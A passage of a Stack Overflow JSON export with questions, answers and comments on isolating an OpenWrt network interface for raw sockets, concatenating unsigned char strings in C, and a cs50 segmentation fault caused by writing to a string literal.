"edited": false, "score": 0, "creation_date": 1499360976, "post_id": 44934063, "comment_id": 76885535, "body": "OK. I have configured the firewall (iptables) so that every IPv4 packets getting dropped. But how can I disable ARP and IPv6 at start up. If I put the two lines you provided above in <code>rc.local</code> I always get a ICMPv6 packet (Router Solicitation) at boot up of the device. I think the commands in the file <code>rc.local</code> are executed too late. Any sugestions?"}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "reply_to_user": {"reputation": 1098, "user_id": 6694684, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/1a3b34689f308f4a92ad3002622bd6d3?s=128&d=identicon&r=PG&f=1", "display_name": "Benjamin J.", "link": "https://stackoverflow.com/users/6694684/benjamin-j"}, "edited": false, "score": 0, "creation_date": 1499364223, "post_id": 44934063, "comment_id": 76887517, "body": "@BenjaminJ. Why is this a problem? You will always receive that packet, the important thing is, that the processing of that packet by the kernel doesn&#39;t hurt your application."}, {"owner": {"reputation": 1098, "user_id": 6694684, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/1a3b34689f308f4a92ad3002622bd6d3?s=128&d=identicon&r=PG&f=1", "display_name": "Benjamin J.", "link": "https://stackoverflow.com/users/6694684/benjamin-j"}, "edited": false, "score": 0, "creation_date": 1499364363, "post_id": 44934063, "comment_id": 76887591, "body": "Sorry. I have expressed myself wrong. The packet is sent by the OpenWrt device. I have checked that via a Wireshark on Windows PC which is connected to eth0."}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "reply_to_user": {"reputation": 1098, "user_id": 6694684, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/1a3b34689f308f4a92ad3002622bd6d3?s=128&d=identicon&r=PG&f=1", "display_name": "Benjamin J.", "link": "https://stackoverflow.com/users/6694684/benjamin-j"}, "edited": false, "score": 0, "creation_date": 1499366631, "post_id": 44934063, "comment_id": 76888818, "body": "@BenjaminJ. you can try to disable ipv6 on the kernel commandline by appending <code>ipv6.disable=1</code>, but this will apply to the whole system then"}], "tags": [], "owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "is_accepted": false, "score": 2, "last_activity_date": 1499281205, "creation_date": 1499281205, "answer_id": 44934063, "question_id": 44933610, "link": "https://stackoverflow.com/questions/44933610/linux-use-interface-for-raw-socket-only/44934063#44934063", "title": "Linux use interface for raw socket only", "body": "<p>This is not possible to achieve with a vanilla kernel. But this can come close:</p>\n\n<p>First, ignore all arp requests on that interface:</p>\n\n<pre><code>echo 8 &gt; /proc/sys/net/ipv4/conf/eth0/arp_ignore\n</code></pre>\n\n<p>Then, disable IPv6:</p>\n\n<pre><code>echo 1 &gt; /proc/sys/net/ipv6/conf/eth0/disable_ipv6\n</code></pre>\n\n<p>Finally, filter all IPv4 packets coming on that interface</p>\n\n<pre><code>iptables -I INPUT -i eth0 -j DROP\n</code></pre>\n\n<p>And do not set an IP-address or routes on that interface. This is of course not perfect, certain packets will still be processed by the kernel, but I don't think there is a much better solution.</p>\n"}], "owner": {"reputation": 1098, "user_id": 6694684, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/1a3b34689f308f4a92ad3002622bd6d3?s=128&d=identicon&r=PG&f=1", "display_name": "Benjamin J.", "link": "https://stackoverflow.com/users/6694684/benjamin-j"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 628, "favorite_count": 0, "answer_count": 1, "score": 5, "last_activity_date": 1499281205, "creation_date": 1499279670, "question_id": 44933610, "link": "https://stackoverflow.com/questions/44933610/linux-use-interface-for-raw-socket-only", "title": "Linux use interface for raw socket only", "body": "<p>I'm having a OpenWrt Linux distribution for my embedded system. The device has 3 network interfaces: eth0, eth1 and wlan0.</p>\n\n<p>One of the network interface (eth0) should be used for raw socket programming only. I'm able to create a socket with the parameters <code>AF_PACKET</code>, <code>SOCK_RAW</code>, <code>ETH_P_ALL</code>. The socket receives all network traffic, I can send packets and everything is OK.</p>\n\n<p>But my problem is, that the OS is also using the interface for sending an reciving (e. g. ARP and ICMP requests/responses).</p>\n\n<p>Is there any option that the interface is only used by my program and not by the OS itself?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1499279683, "post_id": 44933577, "comment_id": 76843075, "body": "<code>strncpy(value1, &quot;1234&quot;, 4)</code> please read the manual page for strncpy() first. Or do <code>strncpy(value1, &quot;1234&quot;, 5);</code> or just strcpy() ..."}, {"owner": {"reputation": 36141, "user_id": 4354477, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/SuxtS.gif?s=128&g=1", "display_name": "ForceBru", "link": "https://stackoverflow.com/users/4354477/forcebru"}, "edited": false, "score": 0, "creation_date": 1499279721, "post_id": 44933577, "comment_id": 76843096, "body": "That <code>unsigned char</code> is <i>a single character</i>, just a number in range at least [0, 255]."}, {"owner": {"reputation": 32321, "user_id": 173397, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pqKT8.jpg?s=128&g=1", "display_name": "pm100", "link": "https://stackoverflow.com/users/173397/pm100"}, "edited": false, "score": 0, "creation_date": 1499280053, "post_id": 44933577, "comment_id": 76843284, "body": "what you actually want is sprintf."}, {"owner": {"reputation": 32321, "user_id": 173397, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pqKT8.jpg?s=128&g=1", "display_name": "pm100", "link": "https://stackoverflow.com/users/173397/pm100"}, "edited": false, "score": 0, "creation_date": 1499280127, "post_id": 44933577, "comment_id": 76843327, "body": "i am sure the compiler is complaining to you about <code>my_function(value1,value2)</code> value1 is a char array but the function is defined to accept one char"}, {"owner": {"reputation": 32321, "user_id": 173397, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pqKT8.jpg?s=128&g=1", "display_name": "pm100", "link": "https://stackoverflow.com/users/173397/pm100"}, "edited": false, "score": 0, "creation_date": 1499280198, "post_id": 44933577, "comment_id": 76843364, "body": "just declare my_function to accept char* rather that char"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1499280592, "post_id": 44933577, "comment_id": 76843579, "body": "Hmm. Do you want to want to convert a value <code>unsigned char</code> to one of type <code>char*</code> or convert a value <code>unsigned char *</code>to one of type <code>char*</code>?"}], "answers": [{"tags": [], "owner": {"reputation": 47633, "user_id": 3889449, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/eb07e0f09deb982a1a0deedca7a5c002?s=128&d=identicon&r=PG", "display_name": "Marco Bonelli", "link": "https://stackoverflow.com/users/3889449/marco-bonelli"}, "is_accepted": false, "score": 0, "last_activity_date": 1499280107, "creation_date": 1499280107, "answer_id": 44933737, "question_id": 44933577, "link": "https://stackoverflow.com/questions/44933577/convert-unsigned-char-to-char-and-concatenate-them-in-c/44933737#44933737", "title": "Convert unsigned char to char* and Concatenate them in C", "body": "<p>First of all, <code>strncpy</code> doesn't automatically add the terminating NUL character <code>'\\0'</code>, so you'll have to add it manually. Secondly, your function parameters are <code>unsigned char</code>, which is a single unsigned character, when they should be either <code>unsigned char*</code> or <code>unsigned char[]</code>, which is a pointer to unsigned character (a string).</p>\n\n<p>This will work:</p>\n\n<pre><code>int my_function(unsigned char* param1, unsigned char* param2)\n{\n    char* buffer_char;\n\n    const char* mss_part_1 = \"Value 1: \";\n    const char* mss_part_2 = \" Value 2: \";\n\n    buffer_char = malloc(240);\n\n    strcpy(buffer_char, mss_part_1);\n    strcat(buffer_char, param1);\n    strcat(buffer_char, mss_part_2);\n    strcat(buffer_char, param2);\n\n    printf(\"%s\", buffer_char);\n\n    free(buffer_char);\n}\n\nint main(int argc, char const *argv[])\n{\n    unsigned char value1[10];\n    unsigned char value2[10];\n\n    strncpy(value1, \"1234\", 4);\n    strncpy(value2, \"5678\", 4);\n\n    value1[4] = '\\0';\n    value2[4] = '\\0';\n\n    my_function(value1, value2);\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 4349, "user_id": 2945815, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7rIjL.jpg?s=128&g=1", "display_name": "little_birdie", "link": "https://stackoverflow.com/users/2945815/little-birdie"}, "is_accepted": true, "score": 3, "last_activity_date": 1499285527, "last_edit_date": 1499285527, "creation_date": 1499280167, "answer_id": 44933761, "question_id": 44933577, "link": "https://stackoverflow.com/questions/44933577/convert-unsigned-char-to-char-and-concatenate-them-in-c/44933761#44933761", "title": "Convert unsigned char to char* and Concatenate them in C", "body": "<p>Your problem is in the function declaration and in understanding the difference between <code>unsigned char</code> and <code>unsigned char[]</code>.  In your function definition:</p>\n\n<pre><code>int my_function(unsigned char param1, unsigned char param2)\n</code></pre>\n\n<p>..you are stating that <code>my_function</code> accepts two parameters, each of type <code>unsigned char</code>.  To the compiler, this means that each parameter contains a single char.. which is not a pointer, but actually an 8 bit integer type.. each parameter is expected to hold a single 8 bit character.  But what you really want to pass is a pointer to an array of characters:</p>\n\n<pre><code>int my_function(unsigned char *param1, unsigned char *param2)\n</code></pre>\n\n<p>or</p>\n\n<pre><code>int my_function(unsigned char param1[], unsigned char param2[])\n</code></pre>\n\n<p>To the compiler, these both mean the same thing, because the name of an array (regardless of the type contained within the array) always evaluates to a pointer to the first element in the array.  </p>\n\n<p>So, when you define a variable:</p>\n\n<pre><code>unsigned char value1[10];\n</code></pre>\n\n<p>.. you are allocating (on the stack, in this case.. since it's a local variable) an array of 10 unsigned chars, one after the other.  But when you pass or refer to <code>value1</code>, it evaluates as the address of the first character in the array, in other words, a pointer to the array, which would be of type <code>unsigned char *</code>.</p>\n\n<p>The second thing you should be thinking about is, why are you using unsigned char when it seems that your text is all regular ASCII characters that are suitable for a char array type?  There is nothing wrong with unsigned char, and the compiler will often do these conversions for you anyway, but in general when you mix up types without being aware of the consequences, you can have problems.  Be aware of what types the functions you are using expect, and try to keep this consistent.</p>\n"}, {"tags": [], "owner": {"reputation": 51929, "user_id": 1084774, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/13403db744d8aa130bb317576cc1df30?s=128&d=identicon&r=PG", "display_name": "PSkocik", "link": "https://stackoverflow.com/users/1084774/pskocik"}, "is_accepted": false, "score": 0, "last_activity_date": 1499280751, "creation_date": 1499280751, "answer_id": 44933926, "question_id": 44933577, "link": "https://stackoverflow.com/questions/44933577/convert-unsigned-char-to-char-and-concatenate-them-in-c/44933926#44933926", "title": "Convert unsigned char to char* and Concatenate them in C", "body": "<p>You're passing in pointers, so the sig of the function should have pointers.</p>\n\n<pre><code>int my_function(unsigned char *param1, unsigned char *param2);\n</code></pre>\n\n<p>The unsigned stuff is likely a needless complication -- you might want to get rid of it in the whole program. You're also using <code>strncpy</code> wrong, are failing to error check (<code>malloc</code> may fail) , and your function's API is weak because it doesn't allow you to do any kind of bound checking.</p>\n\n<p>Here's a quick and dirty fix except for the bounds-checking part:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint my_function(char *param1, char *param2)\n{\n    char* buffer_char;\n\n    const char* mss_part_1 = \"Value 1: \";\n    const char* mss_part_2 = \" Value 2: \";\n\n    buffer_char = malloc(240);\n    if(0 == buffer_char)\n        return -1;\n\n    strcpy(buffer_char, mss_part_1);\n    strcat(buffer_char, param1);\n    strcat(buffer_char, mss_part_2);\n    strcat(buffer_char, param2);\n\n    //Desire Output: \"Value 1: 1234 Value 2: 5678\"\n    printf(\"%s\", buffer_char);\n\n    free(buffer_char);\n    return 0;\n}\n\nint main(int argc, char const *argv[])\n{\n    char value1[10];\n    char value2[10];\n\n    strncpy(value1, \"1234\", 10);\n    strncpy(value2, \"5678\", 10);\n\n    my_function(value1, value2);\n\n    return 0;\n}\n</code></pre>\n\n<p>Your compiler is probably warning you about all these errors. You should treat all the warnings as errors.</p>\n"}], "owner": {"reputation": 483, "user_id": 7903454, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/d4e413a1ee54a14559917559af99d48b?s=128&d=identicon&r=PG&f=1", "display_name": "Noe Cano", "link": "https://stackoverflow.com/users/7903454/noe-cano"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 607, "favorite_count": 0, "accepted_answer_id": 44933761, "answer_count": 3, "score": -2, "last_activity_date": 1499285527, "creation_date": 1499279537, "last_edit_date": 1499280157, "question_id": 44933577, "link": "https://stackoverflow.com/questions/44933577/convert-unsigned-char-to-char-and-concatenate-them-in-c", "title": "Convert unsigned char to char* and Concatenate them in C", "body": "<p>I want to convert a value <code>unsigned char</code> to one of type <code>char*</code> passing values \u200b\u200bthrough a function.</p>\n\n<p>This is my program:</p>\n\n<pre><code>int my_function(unsigned char param1, unsigned char param2)\n{\n    char* buffer_char;\n\n    const char* mss_part_1 = \"Value 1: \";\n    const char* mss_part_2 = \" Value 2: \";\n\n    buffer_char = malloc(240);\n\n    strcpy(buffer_char, mss_part_1);    //OK\n    strcat(buffer_char, param1);        //ERROR\n    strcat(buffer_char, mss_part_2);    //OK\n    strcat(buffer_char, param2);        //ERROR\n\n    //Desire Output: \"Value 1: 1234 Value 2: 5678\"\n    printf(\"%s\", buffer_char);\n\n    free(buffer_char);\n}\n\nint main(int argc, char const *argv[])\n{\n    unsigned char value1[10];\n    unsigned char value2[10];\n\n    strncpy(value1, \"1234\", 4);\n    strncpy(value2, \"5678\", 4);\n\n    my_function(value1, value2);\n\n    return 0;\n}\n</code></pre>\n\n<p>The problem is in the <code>strcat()</code> function when I try to concatenate the value as \"unsigned char\" but I have not found the way to convert it so I can concatenate it.</p>\n\n<p>I am trying to use the <code>strcat()</code> function but if there was a more efficient form I would like to know.</p>\n\n<p>Note: I have no problem displaying the output value.</p>\n"}, {"tags": ["c", "cs50"], "comments": [{"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "edited": false, "score": 2, "creation_date": 1499279359, "post_id": 44933489, "comment_id": 76842919, "body": "There is no C type called <code>string</code>.  Use <code>char hash_guess[] = &quot;A&quot;</code>"}, {"owner": {"reputation": 12073, "user_id": 527574, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/e5b251b4ac8f0cb7942587ee8077cddb?s=128&d=identicon&r=PG", "display_name": "Michael Dorgan", "link": "https://stackoverflow.com/users/527574/michael-dorgan"}, "edited": false, "score": 0, "creation_date": 1499279361, "post_id": 44933489, "comment_id": 76842921, "body": "Id&#39; help if we had the crypt() function.  Also, <code>string</code> is not a C type.  Is this C or C++?  If so, what is <code>string</code>?"}, {"owner": {"reputation": 375, "user_id": 5683152, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/d7Iy3.png?s=128&g=1", "display_name": "sstefan", "link": "https://stackoverflow.com/users/5683152/sstefan"}, "edited": false, "score": 0, "creation_date": 1499279436, "post_id": 44933489, "comment_id": 76842952, "body": "One more thing, there is no need for <code>if(argc == 2)</code>"}, {"owner": {"reputation": 13866, "user_id": 54200, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/6261c8ab215b8069e8290516c80445d8?s=128&d=identicon&r=PG", "display_name": "KevinDTimm", "link": "https://stackoverflow.com/users/54200/kevindtimm"}, "reply_to_user": {"reputation": 12073, "user_id": 527574, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/e5b251b4ac8f0cb7942587ee8077cddb?s=128&d=identicon&r=PG", "display_name": "Michael Dorgan", "link": "https://stackoverflow.com/users/527574/michael-dorgan"}, "edited": false, "score": 0, "creation_date": 1499279701, "post_id": 44933489, "comment_id": 76843083, "body": "@MichaelDorgan - not <code>c</code> or <code>c++</code> but <code>cs50</code>"}, {"owner": {"reputation": 115, "user_id": 5708929, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh5.googleusercontent.com/-ECmq7YAftyc/AAAAAAAAAAI/AAAAAAAAAFs/kqtYYLdUyGc/photo.jpg?sz=128", "display_name": "sruly", "link": "https://stackoverflow.com/users/5708929/sruly"}, "edited": false, "score": 0, "creation_date": 1499279719, "post_id": 44933489, "comment_id": 76843094, "body": "Ignoring the rest of the code why does something like this make a segmentation fault:  string[x]++;"}, {"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "reply_to_user": {"reputation": 13866, "user_id": 54200, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/6261c8ab215b8069e8290516c80445d8?s=128&d=identicon&r=PG", "display_name": "KevinDTimm", "link": "https://stackoverflow.com/users/54200/kevindtimm"}, "edited": false, "score": 0, "creation_date": 1499279895, "post_id": 44933489, "comment_id": 76843201, "body": "@KevinDTimm - Regarding your edit, I did not want to revert before checking with you first,...  <code>cs50</code> falls within the bounds of <code>C</code>, so I believe the C tag can still apply.  i.e., stated in the tag&#39;s description: <i>...This tag should be used for questions which use the cs50.h header or cs50 library along with the C tag.</i>"}, {"owner": {"reputation": 12073, "user_id": 527574, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/e5b251b4ac8f0cb7942587ee8077cddb?s=128&d=identicon&r=PG", "display_name": "Michael Dorgan", "link": "https://stackoverflow.com/users/527574/michael-dorgan"}, "edited": false, "score": 0, "creation_date": 1499280276, "post_id": 44933489, "comment_id": 76843401, "body": "Depending on what type <code>string</code> is, that increment could be undefined behavior.  Imagine if it were in ROM and you told it to write back an incremented address."}, {"owner": {"reputation": 13866, "user_id": 54200, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/6261c8ab215b8069e8290516c80445d8?s=128&d=identicon&r=PG", "display_name": "KevinDTimm", "link": "https://stackoverflow.com/users/54200/kevindtimm"}, "edited": false, "score": 0, "creation_date": 1499289210, "post_id": 44933489, "comment_id": 76848367, "body": "@ryker - IMNSHO, it&#39;s not <code>c</code> when it uses the <code>cs50</code> string type - so many troubles come from that one particular <code>enhancement</code> (as you found in your answer)"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1499345522, "post_id": 44933489, "comment_id": 76873884, "body": "Since you are studying through the horrible cs50 tutorial, you will learn incorrect use of C strings from the start. This is the source of your bug. Throw cs50 out the window and get a good book instead."}], "answers": [{"comments": [{"owner": {"reputation": 12073, "user_id": 527574, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/e5b251b4ac8f0cb7942587ee8077cddb?s=128&d=identicon&r=PG", "display_name": "Michael Dorgan", "link": "https://stackoverflow.com/users/527574/michael-dorgan"}, "edited": false, "score": 0, "creation_date": 1499280541, "post_id": 44933751, "comment_id": 76843552, "body": "The problem is, we just don&#39;t know what <code>string</code> is.  Is it a naked pointer?  Perhaps const value to a ROM table?  Or maybe even just a <code>char</code> that his special system knows to auto terminate.  This falls under need more info I believe."}, {"owner": {"reputation": 115, "user_id": 5708929, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh5.googleusercontent.com/-ECmq7YAftyc/AAAAAAAAAAI/AAAAAAAAAFs/kqtYYLdUyGc/photo.jpg?sz=128", "display_name": "sruly", "link": "https://stackoverflow.com/users/5708929/sruly"}, "edited": false, "score": 1, "creation_date": 1499280594, "post_id": 44933751, "comment_id": 76843580, "body": "Yup, that&#39;s what I needed to do. a char array works."}, {"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "reply_to_user": {"reputation": 12073, "user_id": 527574, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/e5b251b4ac8f0cb7942587ee8077cddb?s=128&d=identicon&r=PG", "display_name": "Michael Dorgan", "link": "https://stackoverflow.com/users/527574/michael-dorgan"}, "edited": false, "score": 0, "creation_date": 1499280650, "post_id": 44933751, "comment_id": 76843608, "body": "@MichaelDorgan - At the very least we know that within the bounds of what is shown, <code>string</code> should not be able to create a variable as it is not a type."}, {"owner": {"reputation": 12073, "user_id": 527574, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/e5b251b4ac8f0cb7942587ee8077cddb?s=128&d=identicon&r=PG", "display_name": "Michael Dorgan", "link": "https://stackoverflow.com/users/527574/michael-dorgan"}, "edited": false, "score": 1, "creation_date": 1499280691, "post_id": 44933751, "comment_id": 76843626, "body": "Looked it up - string in cs50 is typedef to char*.  So now we know."}, {"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "reply_to_user": {"reputation": 12073, "user_id": 527574, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/e5b251b4ac8f0cb7942587ee8077cddb?s=128&d=identicon&r=PG", "display_name": "Michael Dorgan", "link": "https://stackoverflow.com/users/527574/michael-dorgan"}, "edited": false, "score": 0, "creation_date": 1499281271, "post_id": 44933751, "comment_id": 76843977, "body": "@MichaelDorgan - good find.  That changes things a little.  It is not evident in the shown code, but if at any point more than two bytes are assigned to <code>hash_guess</code>, then a <code>seg-fault</code> becomes a possibility."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1499345585, "post_id": 44933751, "comment_id": 76873939, "body": "cs50 is an crap library that defines <code>string</code> as <code>char*</code>. Using this crap library/tutorial is the source of the bug."}], "tags": [], "owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "is_accepted": true, "score": 0, "last_activity_date": 1499345544, "last_edit_date": 1499345544, "creation_date": 1499280138, "answer_id": 44933751, "question_id": 44933489, "link": "https://stackoverflow.com/questions/44933489/segmentation-fault-when-trying-to-increment-letters/44933751#44933751", "title": "Segmentation Fault when trying to increment letters", "body": "<p>I am surprised you are getting a seg-fault.  The code you are showing should not even compile.  </p>\n\n<p>The line:</p>\n\n<pre><code>   string hash_guess = \"A\";\n</code></pre>\n\n<p>uses <code>string</code> as a type.  Unless you have typedef'd <code>string</code> in a part of your code somewhere not shown, it cannot be used to create a variable.</p>\n\n<p>Try:</p>\n\n<pre><code>   char hash_guess[] = \"A\";//creates array of char, 2 bytes long:  |A|0|\n</code></pre>\n\n<p>Even then, if you need this variable to contain more than just 2 bytes, create it with more space:</p>\n\n<pre><code>   char hash_guess[10] = \"A\"; Creates space for 10 bytes: |A|0|0|0|0|0|0|0|0|0|\n</code></pre>\n\n<p>Remember that a C string is defined as an array of char terminated with a NULL.</p>\n\n<p><em>EDIT</em>  Per @MichaelDorgan's finding, <code>cs50</code> typedefs <code>String</code> as <code>char *</code>.  So the offending line now becomes equivalent to:</p>\n\n<pre><code>   char *hash_guess = \"A\";\n</code></pre>\n\n<p>Which is why it compiles and runs.   The segfault could be happening when you explicitly attempt to write to a location in memory that you do not own, which is <em><a href=\"https://www.nayuki.io/page/undefined-behavior-in-c-and-cplusplus-programs\" rel=\"nofollow noreferrer\">UB</a></em>.  (however, it is not clear from looking at your code that this is what is happening, just a guess)</p>\n\n<p>Another conventional way to create and initialize a pointer, then create space (for more than two bytes):</p>\n\n<pre><code>String hash_guess = {0};\nhash_guess = calloc(10, 1);\nif(hash_guess)\n{\n    //... (your code here)\n    //hash_guess can now contain up to 9 characters and the NULL terminator.\n}\nfree(hash_guess);   \n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 12073, "user_id": 527574, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/e5b251b4ac8f0cb7942587ee8077cddb?s=128&d=identicon&r=PG", "display_name": "Michael Dorgan", "link": "https://stackoverflow.com/users/527574/michael-dorgan"}, "is_accepted": false, "score": 0, "last_activity_date": 1499281333, "creation_date": 1499281333, "answer_id": 44934093, "question_id": 44933489, "link": "https://stackoverflow.com/questions/44933489/segmentation-fault-when-trying-to-increment-letters/44934093#44934093", "title": "Segmentation Fault when trying to increment letters", "body": "<p>Ok the reason for the segfault, just for information, is that you are using compiler's read only memory as temporary storage.</p>\n\n<pre><code>typedef string char*;\n\nstring hash_guess = \"A\";\n</code></pre>\n\n<p>The compiler generates a 2 entry constant memory array of 'A' and '\\0'.  You cannot write to this memory.  It is Undefined Behavior.  (UB)</p>\n\n<pre><code>        while(hash_guess[0] &lt;= 'Z' &amp;&amp; hash_guess[0] &gt;= 'A')\n        {\n            hash_guess[0] = hash_guess[0] + 1;\n</code></pre>\n\n<p>...</p>\n\n<p>Is illegal.  You need a temp char array to hold your guess for this to be legal.</p>\n\n<pre><code>char my_guess[5];  // You specify a max length of 4.  Make a constant soon please.\nstrcpy(my_guess, hash_guess);  // Real code never uses this function for safety reasons.\n\n// Beware that later when going to multi-letter check, you will \n// need to re- NUL terminate the string...\n\n        while(my_guess[0] &lt;= 'Z' &amp;&amp; my_guess[0] &gt;= 'A')\n        {\n            my_guess[0] = my_guess[0] + 1;\n// ...\n</code></pre>\n\n<p><code>my_guess</code>is on the stack and safely usable.</p>\n"}], "owner": {"reputation": 115, "user_id": 5708929, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh5.googleusercontent.com/-ECmq7YAftyc/AAAAAAAAAAI/AAAAAAAAAFs/kqtYYLdUyGc/photo.jpg?sz=128", "display_name": "sruly", "link": "https://stackoverflow.com/users/5708929/sruly"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 196, "favorite_count": 0, "closed_date": 1499345755, "accepted_answer_id": 44933751, "answer_count": 2, "score": 1, "last_activity_date": 1499345548, "creation_date": 1499279178, "last_edit_date": 1499345548, "question_id": 44933489, "link": "https://stackoverflow.com/questions/44933489/segmentation-fault-when-trying-to-increment-letters", "closed_reason": "Duplicate", "title": "Segmentation Fault when trying to increment letters", "body": "<pre><code>#include &lt;stdio.h&gt;\n#include &lt;cs50.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n#include &lt;crypt.h&gt;\n\nint main(int argc, string argv[])\n{\n    if(argc &gt; 2){ printf(\"too many arguments\\n\"); return 51; }\n    if(argc &lt; 2){ printf(\"too few arguments\\n\"); return 50; }\n    if(strlen(argv[1]) &gt; 4){ printf(\"Password is greater than 4 characters\\n\"); return 52; }\n\n    if(argc == 2) //make sure there are enough args\n    {\n        string hash_guess = \"A\";\n\n        while(crypt(hash_guess, \"50\") != argv[1]) //while answer not correct\n        {\n            while(hash_guess[0] &lt;= 'Z' &amp;&amp; hash_guess[0] &gt;= 'A')\n            {\n                hash_guess[0] = hash_guess[0] + 1;\n                printf(\"%s\", hash_guess);\n            }\n        }\n\n    }\n\n}\n</code></pre>\n\n<p>I am trying to increment letter by letter through a word, so it would go a then b then c until z then it will go aa, ab, ac, ad.... then ba bb bc bd... then za... zz... zzz. I'm starting with one letter, but I get error \"segmentation fault\"</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1499278892, "post_id": 44933389, "comment_id": 76842669, "body": "Put all of the relevant information <i>as a text</i> in the body of the question."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1499278998, "post_id": 44933389, "comment_id": 76842732, "body": "Please take the <a 